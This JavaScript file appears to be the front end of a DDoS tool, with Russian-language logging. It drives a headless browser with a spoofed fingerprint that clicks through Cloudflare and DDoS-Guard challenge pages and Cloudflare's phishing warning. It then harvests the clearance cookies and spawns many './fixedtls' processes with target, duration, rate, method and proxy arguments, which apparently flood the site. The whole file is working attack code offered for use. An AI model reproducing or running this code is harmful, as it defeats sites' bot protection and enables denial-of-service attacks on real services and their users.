const playwright = require('playwright');
const colors = require('colors');
const { spawn } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = Infinity;

const JSList = {
  js: [
    {
      name: "CloudFlare2",
      navigations: 1,
      locate: '<title>Suspected phishing site | Cloudflare</title>'
    },
    {
      name: "CloudFlare",
      navigations: 1,
      locate: '<title>Just a moment...</title>'
    },
    {
      name: "DDoS-Guard",
      navigations: 1,
      locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;'
    },
    {
      name: "DDoS-Guard-en",
      navigations: 1,
      locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";'
    }
  ]
};

const ignoreNames = [
  "RequestError", "StatusCodeError", "CaptchaError",
  "CloudflareError", "ParseError", "ParserError",
  "TimeoutError", "DeprecationWarning"
];

const ignoreCodes = [
  "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
  "EPIPE", "EHOSTUNREACH", "ETIMEDOUT",
  "ESOCKETTIMEDOUT", "EPROTO", "DEP0123",
  "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"
];

process.on("uncaughtException", handleError);
process.on("unhandledRejection", handleError);
process.on("warning", handleError);
process.on("SIGHUP", () => {});
process.on("SIGCHLD", () => {});

function handleError(e) {
  if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
  console.warn(e);
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function log(msg) {
  const now = new Date();
  const time = now.toTimeString().split(' ')[0];
  console.log(`(${time}) - ${msg}`);
}

const randomIntFromInterval = (min, max) =>
  Math.floor(Math.random() * (max - min + 1) + min);

function cookiesToStr(cookies) {
  return cookies.map(({ name, value }) => `${name}=${value}`).join(";");
}

function JSDetection(html) {
  return JSList.js.find(({ locate }) => html.includes(locate));
}

async function solverInstance(args) {
  log(`(${`PlayWright`.cyan}) Запуск браузера.`);

  const browser = await playwright.chromium.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--disable-features=site-per-process,IsolateOrigins',
      '--disable-infobars',
      '--no-first-run',
      '--ignore-certificate-errors',
      '--ignore-ssl-errors',
      '--no-default-browser-check',
      '--disable-popup-blocking',
      '--disable-extensions',
      '--disable-background-networking',
      '--disable-background-timer-throttling',
      '--disable-renderer-backgrounding',
      '--disable-hang-monitor',
      '--disable-sync',
      '--metrics-recording-only',
      '--disable-default-apps',
      '--mute-audio',
      '--no-zygote',
      '--max-connections-per-host=6',
      '--autoplay-policy=no-user-gesture-required',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  function getRandomUAConfig() {
    const configs = [
      {
        name: 'Windows Chrome',
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        viewport: { width: 1920, height: 1080 },
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false
      },
      {
        name: 'iPhone Safari',
        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        viewport: { width: 390, height: 844 },
        deviceScaleFactor: 3,
        isMobile: true,
        hasTouch: true
      }
    ];
    return configs[Math.floor(Math.random() * configs.length)];
  }

  const uaConfig = getRandomUAConfig();
  log(`(${`UA`.cyan}) Используется профиль: ${uaConfig.name.green}`);

  const context = await browser.newContext({
    userAgent: uaConfig.userAgent,
    viewport: uaConfig.viewport,
    deviceScaleFactor: uaConfig.deviceScaleFactor,
    isMobile: uaConfig.isMobile,
    hasTouch: uaConfig.hasTouch,
    javaScriptEnabled: true
  });

  const page = await context.newPage();

  await page.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    window.chrome = { runtime: {} };
    Object.defineProperty(navigator, 'languages', {
      get: () => ['ru-RU', 'ru']
    });
    Object.defineProperty(navigator, 'plugins', {
      get: () => [1, 2, 3]
    });
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (parameter) {
      if (parameter === 37445) return 'Intel Inc.';
      if (parameter === 37446) return 'Intel Iris OpenGL Engine';
      return getParameter.call(this, parameter);
    };
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications'
        ? Promise.resolve({ state: Notification.permission })
        : originalQuery(parameters)
    );
  });

  try {
    await page.goto(args.Target, { waitUntil: 'domcontentloaded' });
  } catch (e) {
    await browser.close();
    throw e;
  }

  log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);

  await processProtection(page, 'JSDetect [1/2]');
  await processProtection(page, 'JSDetect [2/2]');

  const cookies = cookiesToStr(await page.context().cookies());
  const title = await page.title();

  log(`(${`Harvester`.green}) Заголовок: ${title}`);
  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);

  for (let i = 0; i < args.Threads; i++) {
    spawn('./fixedtls', [args.Target, uaConfig.userAgent, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
  }

  log(`(${`PlayWright`.green}) Сессия закрыта.`);
  await browser.close();
  return cookies;
}

async function processProtection(page, label) {
  const html = await page.content();
  const title = await page.title();

  if (title === "Access denied") {
    log(`(${label.red}) Доступ к странице запрещён.`);
    return;
  }

  const detected = JSDetection(html);
  if (detected) {
    log(`(${label.green}) защита: ${detected.name.yellow}`);



if (detected.name === "CloudFlare") {
  try {
    let redirectHappened = false;

    while (!redirectHappened) {
      // Проверяем наличие фрейма с CloudFlare 
      const frame = page.frames().find(f => f.url().includes('challenges.cloudflare.com'));
      if (!frame) {
        await sleep(8800);
        log(`[${'Playwright'.red}] Фрейм CloudFlare не найден.`);
        break;
      }

      // Ищем checkbox или кнопку для обхода
      const checkbox = await frame.$('input[type="checkbox"]');
      if (checkbox) {
        log(`[${'Playwright'.green}] Найден checkbox для обхода CloudFlare.`);
        const box = await checkbox.boundingBox();
        if (box) {
          // Симуляция клика по checkbox
          await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 20 });
          await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
        }
      } else {
        log(`[${'Playwright'.yellow}] Checkbox не найден, пробуем клик по кнопке.`);
        const button = await frame.$('button');
        if (button) {
          await button.click();
          log(`[${'Playwright'.green}] Кнопка нажата.`);
        } else {
          log(`[${'Playwright'.red}] Кнопка для обхода CloudFlare не найдена.`);
          break;
        }
      }

      // Ожидание редиректа после клика
      try {
        const response = await page.waitForNavigation({ timeout: 10000 });
        if (response) {
          log(`[${'Playwright'.green}] Успешный редирект после обхода.`);
          redirectHappened = true;
        } else {
          log(`[${'Playwright'.yellow}] Редирект не произошел, пробуем снова...`);
        }
      } catch (e) {
        log(`[${'Playwright'.yellow}] Ошибка редиректа: ${e.message}, пробуем снова...`);
      }

      await sleep(3000); // Даем время для обновления страницы
    }
  } catch (e) {
    log(`[${'Playwright'.red}] Ошибка при обработке CloudFlare: ${e.message}`);
  }
}


if (detected.name === "CloudFlare2") {
  try {
    // Поиск кнопки с указанным классом и атрибутами
    const proceedButton = await page.$('button.cf-btn.cf-btn-danger[data-translate="dismiss_and_enter"]');
    if (proceedButton) {
      log(`[${'Playwright'.green}] Кнопка "Ignore & Proceed" найдена.`);
      
      // Нажатие на кнопку
      await proceedButton.click();
      
      // Ожидание редиректа после нажатия
      try {
        await page.waitForNavigation({ timeout: 10000 });
        log(`[${'Playwright'.green}] Навигация после нажатия кнопки прошла успешно.`);
        
        // После редиректа запускаем проверку CloudFlare и JD Detection
        let triggerDetected = true;
        while (triggerDetected) {
          const htmlAfterRedirect = await page.content();
          const titleAfterRedirect = await page.title();

          // Повторная проверка через JSDetection
          const detectedAfterRedirect = JSDetection(htmlAfterRedirect);
          if (detectedAfterRedirect) {
            log(`[${'Playwright'.yellow}] Обнаружен триггер после редиректа: ${detectedAfterRedirect.name}`);
            
            // Выполняем повторную обработку защиты
            if (["CloudFlare", "CloudFlare2"].includes(detectedAfterRedirect.name)) {
              await processProtection(page, 'Повторная обработка CloudFlare');
            } else if (["DDoS-Guard", "DDoS-Guard-en"].includes(detectedAfterRedirect.name)) {
              for (let i = 0; i < 5; i++) {
                await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
              }
              await page.mouse.down();
              await page.mouse.move(100, 100);
              await page.mouse.up();
              await sleep(20630);
              await page.reload({ waitUntil: 'domcontentloaded' });
            }
          } else {
            log(`[${'Playwright'.green}] Триггер не обнаружен, продолжаем.`);
            triggerDetected = false; // Выходим из цикла, если триггер больше не обнаружен
          }
        }
      } catch (e) {
        log(`[${'Playwright'.yellow}] Редирект не произошел: ${e.message}, пробую снова...`);
      }
    } else {
      log(`[${'Playwright'.red}] Кнопка "Ignore & Proceed" не найдена.`);
    }
  } catch (e) {
    log(`[${'Playwright'.red}] Ошибка при обработке CloudFlare2: ${e.message}`);
  }
}



    if (["DDoS-Guard", "DDoS-Guard-en"].includes(detected.name)) {
      for (let i = 0; i < 5; i++) {
        await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
      }
      await page.mouse.down();
      await page.mouse.move(100, 100);
      await page.mouse.up();
      await sleep(20630);
      await page.reload({ waitUntil: 'domcontentloaded' });
    }

    for (let i = 0; i < detected.navigations; i++) {
      await page.waitForNavigation();
      log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
    }
  } else {
    log(`(${label}) Девки нас не ждут заходим`);
  }
}

module.exports = {
  solverInstance
};